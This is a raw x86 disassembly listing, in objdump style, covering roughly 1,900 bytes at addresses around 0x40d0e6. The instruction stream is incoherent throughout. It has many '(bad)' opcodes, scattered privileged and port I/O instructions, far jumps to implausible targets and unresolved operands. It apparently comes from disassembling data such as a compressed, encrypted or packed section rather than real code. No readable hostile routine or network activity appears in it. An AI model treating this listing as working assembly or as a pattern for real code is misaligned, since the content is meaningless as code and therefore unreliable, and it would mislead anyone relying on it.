  40d0e6:	add    dl,BYTE PTR [edi+0x6ad494a5]
  40d0ec:	or     eax,0x8652a54a
  40d0f1:	test   al,0x5c
  40d0f3:	or     ebx,0xffffffc8
  40d0f6:	(bad)  
  40d0f7:	xor    bh,BYTE PTR [ebx-0x7c]
  40d0fa:	sbb    eax,DWORD PTR [ebx+edx*4]
  40d0fd:	test   DWORD PTR [esi-0x1a],eax
  40d100:	mov    bh,0x68
  40d102:	cmp    ebp,DWORD PTR [eax-0x6ebae73f]
  40d108:	std    
  40d109:	sub    ebp,DWORD PTR [edx]
  40d10b:	dec    eax
  40d10c:	mov    cl,0xd3
  40d10e:	xor    eax,0xc6a5d68a
  40d113:	jecxz  0x40d118
  40d115:	std    
  40d116:	adc    DWORD PTR [esp+eax*2],edx
  40d119:	aad    0x29
  40d11b:	scas   eax,DWORD PTR es:[edi]
  40d11c:	je     0x40d152
  40d11e:	jecxz  0x40d112
  40d120:	mov    ecx,0xc8ca880e
  40d125:	inc    edi
  40d126:	push   edi
  40d127:	iret   
  40d128:	mov    ds:0x26c98090,eax
  40d12d:	jmp    0x40d105
  40d12f:	add    esi,DWORD PTR [eax+0x4c07c67f]
  40d135:	dec    edx
  40d136:	int3   
  40d137:	es aas 
  40d139:	jl     0x40d15d
  40d13b:	adc    ecx,DWORD PTR [ebx-0x4]
  40d13e:	pushw  es
  40d140:	mov    eax,ds:0xcc9897dd
  40d145:	mov    ch,0xe9
  40d147:	div    BYTE PTR [edx+esi*8]
  40d14a:	into   
  40d14b:	push   ecx
  40d14c:	and    eax,0xc1084246
  40d151:	dec    esi
  40d152:	jnp    0x40d189
  40d154:	sti    
  40d155:	lods   al,BYTE PTR ds:[esi]
  40d156:	or     DWORD PTR [ecx-0x74],esi
  40d159:	addr16 pop esi
  40d15b:	test   al,0xf2
  40d15d:	(bad)  
  40d15e:	dec    cl
  40d160:	out    dx,eax
  40d161:	push   edx
  40d162:	test   eax,0x999999d4
  40d167:	mov    cl,0x73
  40d169:	xor    edx,DWORD PTR [edx+0x59c6b124]
  40d16f:	add    edx,ecx
  40d171:	frstor [ebp-0x6d]
  40d174:	rol    esi,1
  40d176:	hlt    
  40d177:	jge    0x40d130
  40d179:	(bad)  [ebp+0x7e]
  40d17c:	jle    0x40d11c
  40d17e:	push   0xffffffb5
  40d180:	into   
  40d181:	das    
  40d182:	(bad)  
  40d183:	ficom  DWORD PTR [edi+0x59]
  40d186:	mov    esi,0xa93783e8
  40d18b:	sbb    BYTE PTR [eax+0x49e7e928],al
  40d191:	push   edx
  40d192:	jmp    0xe3d81542
  40d197:	cmp    BYTE PTR [ecx],ah
  40d199:	xchg   ebx,eax
  40d19a:	mov    eax,ds:0xf8b93637
  40d19f:	arpl   bx,di
  40d1a1:	pop    esi
  40d1a2:	shr    DWORD PTR ss:[esi+0x271bd4ce],cl
  40d1a9:	or     DWORD PTR [ecx],ecx
  40d1ab:	xchg   edx,eax
  40d1ac:	pop    eax
  40d1ad:	dec    edx
  40d1ae:	bound  ebx,QWORD PTR [ecx-0x6d8a018]
  40d1b4:	xchg   ch,ch
  40d1b6:	lahf   
  40d1b7:	jl     0x40d226
  40d1b9:	xchg   BYTE PTR [ebp+edx*8+0x5c],al
  40d1bd:	mov    bl,dl
  40d1bf:	mov    esi,0x9bf6734c
  40d1c4:	test   eax,0x23ab52bb
  40d1c9:	into   
  40d1ca:	xor    esi,ecx
  40d1cc:	mov    ch,0xd4
  40d1ce:	ja     0x40d162
  40d1d0:	fnstcw WORD PTR [ebp+0x3a]
  40d1d3:	shl    DWORD PTR [eax+0x3afacb34],cl
  40d1d9:	retf   0xa9cd
  40d1dc:	scas   al,BYTE PTR es:[edi]
  40d1dd:	sub    esp,DWORD PTR [edi+ecx*1+0x4f]
  40d1e1:	enter  0x6a0c,0x73
  40d1e5:	fwait
  40d1e6:	leave  
  40d1e7:	mov    eax,ds:0xbc1083b1
  40d1ec:	in     eax,0xe5
  40d1ee:	shl    bl,0x6d
  40d1f1:	aaa    
  40d1f2:	or     BYTE PTR [eax-0x7efbdada],ah
  40d1f8:	scas   eax,DWORD PTR es:[edi]
  40d1f9:	imul   eax,DWORD PTR [ebx],0x1a
  40d1fc:	add    dh,bh
  40d1fe:	xor    al,0x2
  40d200:	push   eax
  40d201:	cmc    
  40d202:	repnz xchg edx,eax
  40d204:	inc    esp
  40d205:	sbb    DWORD PTR [edx],eax
  40d207:	push   ebx
  40d208:	adc    eax,0xddb52b20
  40d20d:	mov    edi,0xccfa18dd
  40d212:	mov    edx,0x144133f9
  40d217:	stc    
  40d218:	jnp    0x40d22e
  40d21a:	jo     0x40d1f1
  40d21c:	xchg   ecx,eax
  40d21d:	jmp    0x40d1b7
  40d21f:	ins    DWORD PTR es:[edi],dx
  40d220:	std    
  40d221:	jle    0x40d262
  40d223:	xchg   ebp,eax
  40d224:	jo     0x40d220
  40d226:	mov    edx,0x890952e5
  40d22b:	loopne 0x40d229
  40d22d:	test   DWORD PTR [esi],ecx
  40d22f:	mov    BYTE PTR [edx],bh
  40d231:	pop    ecx
  40d232:	mov    ebp,0xc344b54f
  40d237:	(bad)  
  40d238:	sub    BYTE PTR [edx-0x666afce8],dl
  40d23e:	add    al,0x95
  40d240:	inc    edx
  40d241:	jp     0x40d238
  40d243:	fisttp WORD PTR [esi+0x30]
  40d246:	pop    edi
  40d247:	dec    edx
  40d248:	jnp    0x40d1de
  40d24a:	and    eax,0x32faf480
  40d24f:	jae    0x40d1dd
  40d251:	dec    ebx
  40d252:	jecxz  0x40d22d
  40d254:	pop    es
  40d255:	mov    DWORD PTR [ebp+0x32d07b],edx
  40d25b:	ins    DWORD PTR es:[edi],dx
  40d25c:	pop    es
  40d25d:	mov    al,0xd7
  40d25f:	cmp    dh,BYTE PTR ss:[ecx]
  40d262:	and    al,0x4c
  40d264:	repnz lds edi,FWORD PTR [edi]
  40d267:	pop    ebp
  40d268:	jecxz  0x40d231
  40d26a:	(bad)  
  40d26b:	aad    0xef
  40d26d:	repz (bad) 
  40d26f:	jmp    ecx
  40d271:	ja     0x40d243
  40d273:	in     eax,dx
  40d274:	jbe    0x40d2cf
  40d276:	pop    ebx
  40d277:	pop    ebx
  40d278:	mov    ds:0x308f2e5c,eax
  40d27d:	dec    ecx
  40d27e:	push   edi
  40d27f:	sbb    eax,0x60c01170
  40d284:	xor    BYTE PTR [eax-0xf8cd1a4],ah
  40d28a:	loopne 0x40d2cd
  40d28c:	repz fldenv ds:[edi+0x78]
  40d291:	in     al,0xcb
  40d293:	xchg   edi,eax
  40d294:	mov    BYTE PTR [edx-0x74085afb],dl
  40d29a:	sbb    bl,BYTE PTR [ecx-0x23]
  40d29d:	pop    edx
  40d29e:	cmc    
  40d29f:	mov    edx,DWORD PTR [edx+ebp*1-0x6405dd31]
  40d2a6:	lds    edx,FWORD PTR [ecx-0x43903bb0]
  40d2ac:	call   0xef57:0x39af8336
  40d2b3:	adc    BYTE PTR [edx+0x1b],al
  40d2b6:	gs popf 
  40d2b8:	retf   
  40d2b9:	fidivr DWORD PTR [esi+0x5c392936]
  40d2bf:	fcomp  DWORD PTR [esi+0x17d08a2]
  40d2c5:	sti    
  40d2c6:	out    dx,al
  40d2c7:	(bad)  
  40d2c8:	push   ss
  40d2c9:	xchg   ebp,eax
  40d2ca:	in     al,0x5c
  40d2cc:	add    BYTE PTR [edx+0x23],0xa7
  40d2d0:	(bad)  
  40d2d1:	fldenv [esi-0x2]
  40d2d4:	das    
  40d2d5:	mov    esi,0x1d0ff98e
  40d2da:	xlat   BYTE PTR ds:[ebx]
  40d2db:	nop
  40d2dc:	jp     0x40d2df
  40d2de:	loop   0x40d328
  40d2e0:	adc    al,BYTE PTR [edi+0x43133331]
  40d2e6:	add    bl,BYTE PTR [edi+0x31]
  40d2e9:	call   0xec95:0x2a53e122
  40d2f0:	xor    al,0xeb
  40d2f2:	add    bh,BYTE PTR [ebx-0x29]
  40d2f5:	out    0xc8,al
  40d2f7:	aaa    
  40d2f8:	mov    esi,0xa626edc5
  40d2fd:	add    ecx,DWORD PTR [ebx]
  40d2ff:	cmp    al,0xcf
  40d301:	mov    bh,0x7a
  40d303:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d304:	jmp    0x40d2c8
  40d306:	push   ecx
  40d307:	cmc    
  40d308:	add    dl,bl
  40d30a:	(bad)  
  40d30b:	push   esp
  40d30c:	fnsave fs:[edi-0x5f]
  40d310:	out    0xf5,al
  40d312:	or     al,0x7e
  40d314:	out    0x1c,al
  40d316:	pop    ss
  40d317:	ds cdq 
  40d319:	ins    DWORD PTR es:[edi],dx
  40d31a:	out    dx,al
  40d31b:	cmc    
  40d31c:	fsubr  st(6),st
  40d31e:	sbb    dl,BYTE PTR [ebx]
  40d320:	(bad)  
  40d322:	mov    ss,WORD PTR [bp+di]
  40d325:	retf   0x67dd
  40d328:	mov    ah,BYTE PTR [edi+0x78]
  40d32b:	jno    0x40d2b9
  40d32d:	adc    al,0x6a
  40d32f:	pop    esi
  40d330:	inc    eax
  40d331:	lods   eax,DWORD PTR ds:[esi]
  40d332:	pop    esi
  40d333:	mov    ds:0xbeb01ddb,eax
  40d338:	mov    ?,WORD PTR [esi+0x7273174e]
  40d33e:	inc    ebp
  40d33f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d340:	test   eax,0x8613c9fb
  40d345:	pusha  
  40d346:	shl    bh,cl
  40d348:	xchg   BYTE PTR [edx],ah
  40d34a:	mov    ds:0xa5e347cf,al
  40d34f:	mov    edi,0xc3b35479
  40d354:	aam    0x89
  40d356:	fadd   QWORD PTR [ebx+0x553d59c4]
  40d35c:	and    al,0x19
  40d35e:	sbb    eax,0x82790539
  40d363:	sub    BYTE PTR [ecx+0x733e77e6],bl
  40d369:	test   ecx,ebx
  40d36b:	fxch   st(7)
  40d36d:	repz aaa 
  40d36f:	inc    edi
  40d371:	ja     0x40d344
  40d373:	outs   dx,BYTE PTR ds:[esi]
  40d374:	mov    bh,0xe9
  40d376:	je     0x40d3b2
  40d378:	aam    0x6a
  40d37a:	mov    ch,0x11
  40d37c:	mov    ebp,0xc8193f3f
  40d381:	and    BYTE PTR [ebp-0x64411045],al
  40d387:	or     edx,DWORD PTR [edi+0x4ff5f8b6]
  40d38d:	cmp    eax,0x9a776c3
  40d392:	mov    ds:0x63a519a1,al
  40d397:	xor    BYTE PTR [ebx],0x2f
  40d39a:	xchg   esp,eax
  40d39b:	dec    eax
  40d39c:	pop    ebp
  40d39d:	sti    
  40d39e:	push   esp
  40d39f:	or     DWORD PTR [esi+0x28a720d8],eax
  40d3a5:	not    BYTE PTR es:[eax+0xe]
  40d3a9:	or     al,0xd5
  40d3ab:	jnp    0x40d3a3
  40d3ad:	sbb    DWORD PTR ds:0xc6e3a731,ecx
  40d3b3:	xor    DWORD PTR [edx+eiz*2-0x55e98220],esi
  40d3ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3bb:	jecxz  0x40d34a
  40d3bd:	int3   
  40d3be:	mov    cl,0xe9
  40d3c0:	mov    esi,0x96dabaec
  40d3c5:	push   ebp
  40d3c6:	xor    esi,DWORD PTR [edx]
  40d3c8:	jp     0x40d389
  40d3ca:	jp     0x40d34d
  40d3cc:	int3   
  40d3cd:	push   cs
  40d3ce:	stos   DWORD PTR es:[edi],eax
  40d3cf:	push   ebp
  40d3d0:	call   0x75865d42
  40d3d5:	retf   0xafff
  40d3d8:	xchg   edx,eax
  40d3d9:	xor    esp,0x93677239
  40d3df:	push   0xffffffb5
  40d3e1:	dec    esp
  40d3e2:	scas   eax,DWORD PTR es:[edi]
  40d3e3:	scas   eax,DWORD PTR es:[edi]
  40d3e4:	adc    ch,BYTE PTR [ecx+0x7a01f3e4]
  40d3ea:	sahf   
  40d3eb:	inc    edi
  40d3ec:	stos   DWORD PTR es:[edi],eax
  40d3ed:	aad    0x1a
  40d3ef:	jno    0x40d3f2
  40d3f1:	jmp    0xdbab:0x70df91b6
  40d3f8:	dec    ebp
  40d3f9:	add    eax,0x4185a502
  40d3fe:	add    al,0x2e
  40d400:	or     eax,0xc698292b
  40d405:	test   al,0x1b
  40d407:	into   
  40d408:	imul   ebx,DWORD PTR [edx-0x6f],0x7
  40d40c:	mov    al,ds:0x64ef6a48
  40d411:	fdiv   DWORD PTR [ebx-0x77]
  40d414:	mov    eax,0x6f3b088
  40d419:	sub    al,0x17
  40d41b:	and    DWORD PTR [eax+0x3601061e],edi
  40d421:	push   fs
  40d423:	jno    0x40d428
  40d425:	or     cl,bh
  40d427:	and    ecx,DWORD PTR [edx+0x3a8dea63]
  40d42d:	fucomp st(6)
  40d42f:	nop
  40d430:	outs   dx,BYTE PTR ds:[esi]
  40d431:	mov    edi,0xd3ff085a
  40d436:	addr16 push edx
  40d438:	nop
  40d439:	dec    edi
  40d43a:	lds    ebp,FWORD PTR [eax-0xeb0b785]
  40d440:	mov    edi,DWORD PTR [ebx+edi*8-0x76190332]
  40d447:	fist   DWORD PTR [ebp-0x21028616]
  40d44d:	cmp    eax,0xa99a86f7
  40d452:	in     al,dx
  40d453:	arpl   WORD PTR [ebx],di
  40d455:	add    ch,BYTE PTR [edi+esi*2+0x501de300]
  40d45c:	(bad)  
  40d45d:	or     al,0xe3
  40d45f:	pop    ecx
  40d460:	jle    0x40d44b
  40d462:	aas    
  40d463:	lahf   
  40d464:	in     eax,0xce
  40d466:	cmp    ebx,DWORD PTR [esi-0x4090621b]
  40d46c:	xchg   DWORD PTR [edi],esp
  40d46e:	lahf   
  40d46f:	jl     0x40d403
  40d471:	outs   dx,BYTE PTR ds:[esi]
  40d472:	mov    bh,0x4b
  40d474:	test   eax,0x2831da54
  40d479:	dec    eax
  40d47a:	dec    edx
  40d47b:	adc    eax,0x3f3f33f0
  40d480:	iret   
  40d481:	(bad)  
  40d482:	les    esp,FWORD PTR [edi+edi*8]
  40d485:	idiv   bh
  40d487:	(bad)  
  40d488:	pop    ebp
  40d489:	mov    ?,WORD PTR [ebp+0x57b2403c]
  40d48f:	pop    es
  40d490:	std    
  40d491:	mov    eax,0x3cd8815
  40d496:	sbb    BYTE PTR [eax],ah
  40d498:	xchg   edx,eax
  40d499:	call   0x495ef838
  40d49e:	in     al,dx
  40d49f:	pop    ecx
  40d4a0:	push   ebp
  40d4a1:	mov    DWORD PTR es:[ebx],edx
  40d4a4:	push   esp
  40d4a5:	outs   dx,DWORD PTR ds:[esi]
  40d4a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4a7:	jbe    0x40d4cc
  40d4a9:	push   ebx
  40d4aa:	sub    DWORD PTR [ecx],edi
  40d4ac:	sbb    eax,0x445b0213
  40d4b1:	push   ebp
  40d4b2:	test   al,0x80
  40d4b4:	pop    ds
  40d4b5:	imul   esi,esp,0xef8e8cf5
  40d4bb:	push   ds
  40d4bc:	outs   dx,DWORD PTR ds:[esi]
  40d4bd:	rol    BYTE PTR [eax-0x66f6a3df],1
  40d4c3:	mov    al,ds:0xe0d6d722
  40d4c8:	jle    0x40d52a
  40d4ca:	loope  0x40d4e4
  40d4cc:	push   cs
  40d4cd:	xor    ebx,DWORD PTR [ebp+0x199aaeab]
  40d4d3:	mov    ds:0x155a2412,eax
  40d4d8:	push   ecx
  40d4d9:	adc    eax,DWORD PTR [edx+0x789204e2]
  40d4df:	rcl    ah,0x44
  40d4e2:	pusha  
  40d4e3:	(bad)  
  40d4e4:	mov    eax,ds:0xc66d861b
  40d4e9:	stos   DWORD PTR es:[edi],eax
  40d4ea:	stos   DWORD PTR es:[edi],eax
  40d4eb:	ds out 0x9b,eax
  40d4ee:	adc    dl,ah
  40d4f0:	mov    dh,0x94
  40d4f2:	add    esi,DWORD PTR [ebx-0x25]
  40d4f5:	dec    ebp
  40d4f6:	mov    edx,0xcbf9dd01
  40d4fb:	(bad)  
  40d4fc:	in     al,0x98
  40d4fe:	in     al,dx
  40d4ff:	jb     0x40d557
  40d501:	add    eax,0xf29a1bc8
  40d506:	sub    BYTE PTR [eax-0x49],ah
  40d509:	mov    esi,0x1d15b77c
  40d50e:	jecxz  0x40d55e
  40d510:	lea    esi,[ebp+0x19]
  40d513:	sub    DWORD PTR [ecx+0x10e8400],0x4c8c7116
  40d51d:	adc    ch,dl
  40d51f:	mov    ch,0x1a
  40d521:	pop    ebx
  40d522:	popf   
  40d523:	nop
  40d524:	pop    esi
  40d525:	mov    edi,0xd7d4ea94
  40d52a:	push   0x69034066
  40d52f:	jp     0x40d52e
  40d531:	sbb    eax,0xbafd5b88
  40d536:	les    ebp,FWORD PTR ds:0x29b8732d
  40d53c:	ret    0x3ccf
  40d53f:	dec    eax
  40d540:	add    al,dl
  40d542:	push   ebp
  40d543:	pop    es
  40d544:	shl    BYTE PTR [ecx+edi*4],0xcc
  40d548:	push   ss
  40d549:	cld    
  40d54a:	adc    BYTE PTR [ebx+edi*2-0x403b038d],dh
  40d551:	jle    0x40d4d5
  40d553:	add    edi,ebx
  40d555:	div    DWORD PTR [eax-0x21]
  40d558:	jge    0x40d551
  40d55a:	icebp  
  40d55b:	in     al,0x93
  40d55d:	dec    edi
  40d55e:	adc    al,BYTE PTR [ebp-0x6f]
  40d561:	or     eax,0xa77fca88
  40d566:	loope  0x40d5d8
  40d568:	dec    eax
  40d569:	test   eax,0xa1d0e254
  40d56e:	cmp    edi,eax
  40d570:	mov    ebp,0xe7c53ccf
  40d575:	mov    esi,0xd9289178
  40d57a:	add    edi,DWORD PTR [esi+0x53]
  40d57d:	(bad)  [ecx+0x24]
  40d580:	fs dec ebx
  40d582:	mov    DWORD PTR [ebx+0x49df4807],ebx
  40d588:	push   0xffffffc6
  40d58a:	sbb    al,0x27
  40d58c:	sahf   
  40d58d:	(bad)  
  40d58e:	mov    ebx,0xc55488d
  40d593:	aam    0x58
  40d595:	clc    
  40d596:	test   eax,edx
  40d598:	sahf   
  40d599:	and    al,0xe9
  40d59b:	mov    gs,WORD PTR ds:0x9e44263d
  40d5a1:	lock push ebp
  40d5a3:	lods   eax,DWORD PTR ds:[esi]
  40d5a4:	push   es
  40d5a5:	popa   
  40d5a6:	sbb    DWORD PTR [edi-0x2f4afb35],ebp
  40d5ac:	add    ch,cl
  40d5ae:	adc    ah,dh
  40d5b0:	sti    
  40d5b1:	or     BYTE PTR [ecx-0x1744f67a],dl
  40d5b7:	outs   dx,BYTE PTR ds:[esi]
  40d5b8:	pop    es
  40d5b9:	cmc    
  40d5ba:	xor    DWORD PTR [ebp+0x7],edx
  40d5bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5be:	sti    
  40d5bf:	dec    edx
  40d5c0:	push   esi
  40d5c1:	cli    
  40d5c2:	mov    ebx,0x39130af5
  40d5c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5c8:	push   edx
  40d5c9:	icebp  
  40d5ca:	inc    esi
  40d5cb:	mov    esi,0x529659b9
  40d5d0:	inc    ebp
  40d5d1:	cdq    
  40d5d2:	push   ss
  40d5d3:	inc    ebp
  40d5d4:	add    dl,ch
  40d5d6:	cmc    
  40d5d7:	fucomi st,st(2)
  40d5d9:	add    al,BYTE PTR [ebx+ebx*4-0x11cbfb74]
  40d5e0:	cmp    eax,0xaccc40e1
  40d5e5:	xchg   esp,eax
  40d5e6:	push   ebp
  40d5e7:	popf   
  40d5e8:	out    dx,eax
  40d5e9:	sti    
  40d5ea:	pop    esi
  40d5eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5ec:	xor    BYTE PTR [eax+0x648cb83b],cl
  40d5f2:	jbe    0x40d5c9
  40d5f4:	add    DWORD PTR [edi-0xb4d89ad],esi
  40d5fa:	out    dx,eax
  40d5fb:	mov    ah,0xe
  40d5fd:	mov    WORD PTR [eax-0x2a],?
  40d600:	and    dl,BYTE PTR [ebp+0x28db42c1]
  40d606:	rcl    BYTE PTR [ebp-0x187bec83],cl
  40d60c:	imul   eax,esp,0x358c682c
  40d612:	cmp    BYTE PTR [ecx+0x2f41857c],bh
  40d618:	inc    eax
  40d619:	jmp    0x1804bcc1
  40d61e:	sub    esp,edx
  40d620:	xor    al,BYTE PTR [ecx+0x23a01518]
  40d626:	gs xchg esi,eax
  40d628:	cdq    
  40d629:	gs sub eax,0x7cbaa3ff
  40d62f:	jbe    0x40d5b1
  40d631:	pop    esp
  40d632:	mov    ds:0xd9b46ff3,eax
  40d637:	repnz fiadd WORD PTR ds:0x4cb0136
  40d63e:	and    al,0xe0
  40d640:	mov    bl,0xb2
  40d642:	ss ret 
  40d644:	daa    
  40d645:	jg     0x40d63b
  40d647:	repz cld 
  40d649:	aas    
  40d64a:	aas    
  40d64b:	mul    DWORD PTR [ecx+0x1e]
  40d64e:	jl     0x40d640
  40d650:	inc    ecx
  40d651:	sahf   
  40d652:	js     0x40d636
  40d654:	or     DWORD PTR [esi],eax
  40d656:	add    DWORD PTR [ecx],0xffffffb5
  40d659:	pop    edx
  40d65a:	or     eax,0x3094d548
  40d65f:	or     al,0x19
  40d661:	push   cs
  40d662:	xchg   esp,ebx
  40d664:	jae    0x40d635
  40d666:	cmp    eax,0xceb73d9c
  40d66b:	scas   eax,DWORD PTR es:[edi]
  40d66c:	inc    dh
  40d66e:	xchg   ebx,eax
  40d66f:	ins    BYTE PTR es:[edi],dx
  40d670:	mov    bh,0x1b
  40d672:	and    BYTE PTR [edx-0x40ecb2c0],bl
  40d678:	jle    0x40d62b
  40d67a:	mov    esp,0x886ad554
  40d67f:	and    dl,BYTE PTR [esi]
  40d681:	in     eax,0x16
  40d683:	push   esp
  40d684:	add    BYTE PTR ss:[ecx-0x1c],al
  40d688:	or     DWORD PTR [edx],eax
  40d68a:	popf   
  40d68b:	xor    ecx,edi
  40d68d:	popw   es
  40d68f:	adc    al,BYTE PTR [edx]
  40d691:	xor    dl,al
  40d693:	cmp    al,0x15
  40d695:	and    BYTE PTR [esi-0x2ce95aa0],al
  40d69b:	mov    dh,al
  40d69d:	lea    eax,[ebp+0x4ba3c4de]
  40d6a3:	jnp    0x40d721
  40d6a5:	inc    esi
  40d6a6:	pop    esi
  40d6a7:	cmp    ebp,ebx
  40d6a9:	(bad)  
  40d6aa:	fistp  WORD PTR [edi-0x18]
  40d6ad:	gs sub al,bl
  40d6b0:	outs   dx,BYTE PTR ds:[esi]
  40d6b1:	lahf   
  40d6b2:	inc    edi
  40d6b3:	fs pop edi
  40d6b5:	sub    eax,0xcf4d0231
  40d6ba:	add    al,0xc
  40d6bc:	mov    eax,ds:0xebb98b59
  40d6c1:	loopne 0x40d6fb
  40d6c3:	and    DWORD PTR [ecx-0x4f],0x7
  40d6c7:	sar    BYTE PTR [edi+ebp*2+0x33],0x3f
  40d6cc:	and    edi,DWORD PTR [ebx+0x7f]
  40d6cf:	inc    edx
  40d6d0:	outs   dx,BYTE PTR ds:[esi]
  40d6d1:	push   ebx
  40d6d2:	cmp    eax,0x4ddb740
  40d6d7:	add    eax,DWORD PTR [eax]
  40d6d9:	iret   
  40d6da:	or     esi,esp
  40d6dc:	push   esp
  40d6dd:	pusha  
  40d6de:	ja     0x40d70e
  40d6e0:	and    BYTE PTR [ecx+0xe],0xa9
  40d6e4:	push   ds
  40d6e5:	lods   al,BYTE PTR ds:[esi]
  40d6e6:	out    0x2,al
  40d6e8:	push   esp
  40d6e9:	in     eax,dx
  40d6ea:	jle    0x40d6c3
  40d6ec:	rcl    BYTE PTR [edi+edx*4-0xccf7902],0x2a
  40d6f4:	or     DWORD PTR [ebx-0x14],0xb7770279
  40d6fb:	out    0x91,eax
  40d6fd:	ret    
  40d6fe:	dec    esi
  40d6ff:	(bad)  
  40d700:	or     ah,BYTE PTR [ecx]
  40d702:	adc    BYTE PTR [esi+0x1bf9f2a7],bl
  40d708:	enter  0x7fab,0x7d
  40d70c:	fbld   TBYTE PTR [edi+0x72]
  40d70f:	jb     0x40d69b
  40d711:	int    0xcd
  40d713:	out    0x29,eax
  40d715:	jns    0x40d75e
  40d717:	dec    ecx
  40d718:	les    edi,FWORD PTR [esi]
  40d71a:	bound  esp,QWORD PTR [esi-0x69bea9c0]
  40d720:	rcl    BYTE PTR [edi-0x1938a5e6],0xa2
  40d727:	dec    eax
  40d728:	or     esi,DWORD PTR [ecx-0x6b]
  40d72b:	xor    eax,0xdc408b39
  40d730:	sti    
  40d731:	out    0xa5,al
  40d733:	jmp    FWORD PTR ds:0x25db5268
  40d739:	inc    esi
  40d73a:	cwde   
  40d73b:	or     BYTE PTR [eax-0x2b],0x1
  40d73f:	or     ecx,edi
  40d741:	sub    ebx,DWORD PTR [edi+edi*1]
  40d744:	push   ecx
  40d745:	out    0xef,eax
  40d747:	(bad)  
  40d748:	outs   dx,DWORD PTR ds:[esi]
  40d749:	mov    edi,0xf3fe4fc5
  40d74e:	psllw  mm6,mm0
  40d751:	ret    
  40d752:	psllq  mm3,mm4
  40d755:	jae    0x40d726
  40d757:	jno    0x40d74e
  40d759:	jmp    0x79e0:0x25cd2055
  40d760:	push   ds
  40d761:	ja     0x40d742
  40d763:	jge    0x40d79c
  40d765:	xor    esi,DWORD PTR [ebx]
  40d767:	repz cld 
  40d769:	int3   
  40d76a:	mov    edi,0x9c4e4dff
  40d76f:	mov    ss,WORD PTR [ecx-0x2a5665e]
  40d775:	push   ebp
  40d776:	pop    es
  40d777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d778:	das    
  40d779:	push   0x5be8fdd
  40d77e:	push   es
  40d77f:	ror    BYTE PTR [ebx+0x74],cl
  40d782:	sub    al,0x80
  40d784:	sub    bl,BYTE PTR [ebx-0x6eceb8e3]
  40d78a:	(bad)  
  40d78b:	hlt    
  40d78c:	sahf   
  40d78d:	adc    al,0x8e
  40d78f:	jle    0x40d7fe
  40d791:	into   
  40d792:	aad    0x46
  40d794:	push   ebp
  40d795:	xchg   edi,eax
  40d796:	clc    
  40d797:	lods   al,BYTE PTR ds:[esi]
  40d798:	xchg   edx,eax
  40d799:	out    dx,al
  40d79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d79b:	mov    bh,0xb2
  40d79d:	inc    ecx
  40d79e:	aas    
  40d79f:	imul   edi,DWORD PTR [ecx+ecx*4+0x2b],0x822af294
  40d7a7:	add    al,BYTE PTR [edx]
  40d7a9:	mov    ?,esp
  40d7ab:	mov    bh,0xaa
  40d7ad:	cmp    bl,0x51
  40d7b0:	push   edx
  40d7b1:	fild   DWORD PTR [ebx+0x26]
  40d7b4:	pop    ds
  40d7b5:	mov    al,ds:0xa4fb2e7e
  40d7ba:	(bad)  
  40d7bb:	push   es
  40d7bc:	and    BYTE PTR [ebp+0x35],ch
  40d7bf:	mov    al,ds:0xbd98f189
  40d7c4:	repz or eax,0xf857b0a2
  40d7ca:	jns    0x40d758
  40d7cc:	shr    BYTE PTR [ebx-0x4b],0x5a
  40d7d0:	sbb    DWORD PTR [esp+ebp*4+0x156c045b],esp
  40d7d7:	sahf   
  40d7d8:	js     0x40d7e5
  40d7da:	fisttp DWORD PTR [ebp+0x4c]
  40d7dd:	pop    es
  40d7de:	div    BYTE PTR [esp+ecx*2]
  40d7e1:	xor    ebx,DWORD PTR [eax+edi*1-0x55]
  40d7e5:	inc    edi
  40d7e6:	(bad)  
  40d7e7:	jmp    0xef77:0x9e485955
  40d7ee:	in     eax,0xd
  40d7f0:	jne    0x40d858
  40d7f2:	jg     0x40d805
  40d7f4:	and    dh,BYTE PTR [eax-0x51]
  40d7f7:	jae    0x40d826
  40d7f9:	clc    
  40d7fa:	lahf   
  40d7fb:	addr16 sbb cl,bh
  40d7fe:	jae    0x40d83d
  40d800:	and    DWORD PTR [eax-0x15f5d55c],ecx
  40d806:	stc    
  40d807:	mov    esi,0x84920752
  40d80c:	pop    edx
  40d80d:	lods   eax,DWORD PTR ds:[esi]
  40d80e:	inc    esi
  40d80f:	pushf  
  40d810:	or     BYTE PTR [esi-0x203426e4],cl
  40d816:	stc    
  40d817:	fwait
  40d818:	sti    
  40d819:	pop    ecx
  40d81a:	ds jnp 0x40d7b6
  40d81d:	in     eax,0xe5
  40d81f:	jecxz  0x40d87d
  40d821:	pop    edx
  40d822:	test   eax,0xa355beb0
  40d827:	aas    
  40d828:	pushf  
  40d829:	and    al,0xe
  40d82b:	test   DWORD PTR [eax+0x4d2a26c],0x8240a7b
  40d835:	nop
  40d836:	xor    al,BYTE PTR [edx-0x6e]
  40d839:	and    BYTE PTR [edx-0x1c3176f8],dl
  40d83f:	xchg   ebx,eax
  40d840:	xchg   ecx,eax
  40d841:	not    bh
  40d843:	xor    BYTE PTR [eax],ch
  40d845:	jl     0x40d86a
  40d847:	pop    ebx
  40d848:	and    DWORD PTR [ebx],edx
  40d84a:	and    BYTE PTR [ebp+0x7],dl
  40d84d:	nop
  40d84e:	sbb    BYTE PTR [ebx-0x1c315b5f],ah
  40d854:	dec    edi
  40d855:	(bad)  
  40d856:	jl     0x40d854
  40d858:	scas   eax,DWORD PTR es:[edi]
  40d859:	(bad)  
  40d85a:	sub    bl,bh
  40d85c:	push   DWORD PTR [ecx+0x3f97f2d7]
  40d862:	hlt    
  40d863:	adc    BYTE PTR [ebp+0x572b874e],bl
  40d869:	scas   al,BYTE PTR es:[edi]
  40d86a:	fdivr  DWORD PTR [ecx]
  40d86c:	adc    dl,BYTE PTR [ebx+0x53]
  40d86f:	push   ebx
  40d870:	js     0x40d8f0
  40d872:	popf   
  40d873:	lahf   
  40d874:	sti    
  40d875:	(bad)  
  40d876:	lahf   
  40d877:	in     eax,0x8f
  40d879:	pop    ds
  40d87a:	cmp    DWORD PTR [edi-0x3e],ecx
  40d87d:	sub    al,0xd0
  40d87f:	inc    eax
  40d880:	stc    
  40d881:	cld    
